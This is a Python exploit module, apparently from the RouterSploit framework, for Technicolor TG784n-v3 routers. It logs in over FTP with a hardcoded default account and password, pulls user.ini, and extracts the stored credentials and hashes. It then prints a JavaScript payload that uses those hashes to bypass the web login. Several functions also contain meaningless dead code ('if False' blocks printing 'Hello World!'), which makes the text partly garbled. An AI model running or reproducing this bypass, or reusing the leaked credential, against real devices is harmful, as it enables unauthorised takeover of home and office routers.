import re
from routersploit.core.exploit import *
from routersploit.core.ftp.ftp_client import FTPClient

class Exploit(FTPClient):
    __info__ = {'name': 'Technicolor TG784n-v3 Auth Bypass', 'description': 'Module exploits Technicolor TG784n-v3 authentication bypass vulnerability.', 'authors': ('Jose Moreira', '0BuRner', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('http://modem-help.forum-phpbb.co.uk/t1-fixing-username-password-problems', 'http://modem-help.forum-phpbb.co.uk/t2-howto-root-tg784'), 'devices': ('Technicolor TG784n-v3', 'Unknown number of Technicolor and Thompson routers')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(21, 'Target FTP port')
    username = OptString('upgrade', 'Default FTP username')
    password = OptString('Th0ms0n!', 'Default FTP password for "upgrade" user')

    def run(self):
        if False:
            while True:
                i = 10
        creds = self.get_credentials()
        if creds:
            print_success('Found encrypted credentials:')
            print_table(('Name', 'Password', 'Role', 'Hash2', 'Crypt'), *creds)
            print_status('Use javascript console (through developer tools) to bypass authentication:')
            payload = 'var user = "{}"\nvar hash2 = "{}";\nvar HA2 = MD5("GET" + ":" + uri);\ndocument.getElementById("user").value = user;\ndocument.getElementById("hidepw").value = MD5(hash2 + ":" + nonce +":" + "00000001" + ":" + "xyz" + ":" + qop + ":" + HA2);\ndocument.authform.submit();\n'
            for user in creds:
                print_success('User: {} Role: {}'.format(user[0], user[2]))
                print_info(payload.format(user[0], user[3]))
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            print('Hello World!')
        if self.get_credentials():
            return True
        return False

    def get_credentials(self):
        if False:
            print('Hello World!')
        print_status('Trying FTP authentication with Username: {} and Password: {}'.format(self.username, self.password))
        ftp_client = self.ftp_create()
        if ftp_client.login(self.username, self.password):
            print_success('Authentication successful')
            content = self.ftp_get_content(ftp_client, 'user.ini')
            creds = re.findall('add name=(.*) password=(.*) role=(.*) hash2=(.*) crypt=(.*)\\r\\n', str(content, 'utf-8'))
            return creds
        else:
            print_error('Exploit failed - authentication failed')
        return None